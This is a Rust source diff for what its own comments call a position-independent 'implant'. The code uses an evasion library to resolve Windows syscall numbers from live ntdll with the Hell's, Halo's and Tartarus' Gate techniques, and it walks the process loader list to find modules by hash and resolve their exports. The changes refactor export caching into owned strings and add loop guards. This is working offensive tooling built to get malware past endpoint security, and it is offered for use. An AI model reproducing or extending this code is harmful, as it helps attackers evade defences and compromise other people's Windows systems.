@@ -186,46 +186,35 @@ impl LiveNtdll {
     }
 }
 
-impl nyx_evasion::SyscallSource for LiveNtdll {
-    fn read(&self, rva: u32, len: usize) -> Vec<u8> {
-        unsafe {
-            let ptr = self.module.base.add(rva as usize);
-            core::slice::from_raw_parts(ptr, len).to_vec()
-        }
-    }
-    fn exports(&self) -> &[(String, u32)] {
-        // The evasion trait wants &[String]; our cache holds HeapStr. We can't
-        // produce a &[String] without a conversion allocation that outlives the
-        // call, so the resolver is invoked via a wrapper that owns Strings.
-        // (See `resolve_table_owned` — the canonical entry point.)
-        //
-        // This trait method is kept for API conformance; callers use the owned
-        // path below which is allocation-safe.
-        unreachable!("use resolve_table_owned")
-    }
-}
-
 impl LiveNtdll {
     /// Resolve the SSN table over the live ntdll. This is the bridge that turns
     /// `nyx_evasion`'s algorithms (Hell's/Halo's/Tartarus' Gate) into a live
     /// runtime result: real stub bytes, real export RVAs.
+    ///
+    /// Returns an owned Vec — no dangling borrows. The resolver iterates
+    /// exports() once internally; we satisfy that by materializing HeapStr→String
+    /// into a local Vec that outlives the resolve_table call.
     pub fn resolve_table_owned(&self) -> Vec<(String, u32)> {
-        // Build a String-backed source view for the resolver.
-        let src = OwnedSyscallSource {
-            base: self.module.base,
-            exports: &self.exports,
-        };
+        // Materialize exports into owned Strings, then build a source that
+        // borrows them for the duration of resolve_table. The borrow is scoped
+        // to this function, so no 'static lie.
+        let owned: Vec<(String, u32)> = self
+            .exports
+            .iter()
+            .map(|(name, rva)| (name.to_string_lossy(), *rva))
+            .collect();
+        let src = OwnedSource { base: self.module.base, exports: &owned };
         nyx_evasion::resolve_table(&src)
     }
 }
 
-/// A SyscallSource backed by String names (so the trait method is satisfiable).
-struct OwnedSyscallSource<'a> {
+/// A SyscallSource backed by an owned (String, u32) slice borrowed for the call.
+struct OwnedSource<'a> {
     base: *mut u8,
-    exports: &'a [(HeapStr, u32)],
+    exports: &'a [(String, u32)],
 }
 
-impl<'a> nyx_evasion::SyscallSource for OwnedSyscallSource<'a> {
+impl<'a> nyx_evasion::SyscallSource for OwnedSource<'a> {
     fn read(&self, rva: u32, len: usize) -> Vec<u8> {
         unsafe {
             let ptr = self.base.add(rva as usize);
@@ -233,27 +222,7 @@ impl<'a> nyx_evasion::SyscallSource for OwnedSyscallSource<'a> {
         }
     }
     fn exports(&self) -> &[(String, u32)] {
-        // We can't return &[String] from HeapStr without allocation; the
-        // resolver only iterates, so we expose names via a thread-local cache.
-        // To keep this simple and allocation-bounded, we materialize on demand
-        // into a static buffer (single-threaded PIC; safe).
-        materialize_exports(self.exports)
-    }
-}
-
-// PIC is single-threaded at boot, so a process-global mutable buffer is safe.
-// (thread_local! needs std; under #![no_std] we use a static mut.)
-static mut EXPORT_CACHE: Vec<(String, u32)> = Vec::new();
-
-fn materialize_exports(src: &[(HeapStr, u32)]) -> &'static [(String, u32)] {
-    // SAFETY: PIC implant is single-threaded during resolve; no concurrent access.
-    unsafe {
-        EXPORT_CACHE.clear();
-        EXPORT_CACHE.reserve(src.len());
-        for (name, rva) in src {
-            EXPORT_CACHE.push((name.to_string_lossy(), *rva));
-        }
-        core::slice::from_raw_parts(EXPORT_CACHE.as_ptr(), EXPORT_CACHE.len())
+        self.exports
     }
 }
 
@@ -266,7 +235,9 @@ unsafe fn find_module_by_hash(name_hash: u32) -> Option<Module> {
     }
     let mut head = (*ldr).in_load_order_module_list.flink;
     let list_start: *const u8 = &(*ldr).in_load_order_module_list as *const _ as *const u8;
-    while head as *const u8 != list_start {
+    let mut _guard = 0u32;
+    while head as *const u8 != list_start && _guard < 256 {
+        _guard += 1;
         // in_load_order_links is the first field of ListEntry, so the address of
         // the ListHead == the address of the containing ListEntry (CONTAINING_RECORD
         // with offset 0). Cast directly.
@@ -414,7 +385,9 @@ pub unsafe fn export_addr(module: &[u8], func: &[u8]) -> Option<usize> {
     }
     let mut head = (*ldr).in_load_order_module_list.flink;
     let start: *const u8 = &(*ldr).in_load_order_module_list as *const _ as *const u8;
-    while head as *const u8 != start {
+    let mut _guard = 0u32;
+    while head as *const u8 != start && _guard < 256 {
+        _guard += 1;
         let entry = head as *mut ListEntry;
         let nb = (*entry).base_dll_name.buffer;
         let nl = (*entry).base_dll_name.length as usize / 2;
